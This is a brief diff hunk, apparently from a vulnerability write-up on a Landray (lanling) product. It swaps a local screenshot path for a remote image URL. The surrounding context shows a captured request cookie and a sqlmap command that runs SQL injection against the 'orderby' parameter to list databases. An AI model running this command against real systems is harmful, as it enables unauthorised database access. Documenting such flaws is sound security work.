@@ -46,7 +46,7 @@ Cookie: UM_distinctid=1785f7392888e1-02ece8c7e9a996-5771031-1fa400-1785f73928943
 sqlmap -r sql.txt -p orderby --dbs
 ```
 
-![](image/lanling-1.png)
+![](http://wikioss.peiqi.tech/vuln/lanling-1.png)
 
 ## 感谢名单
 
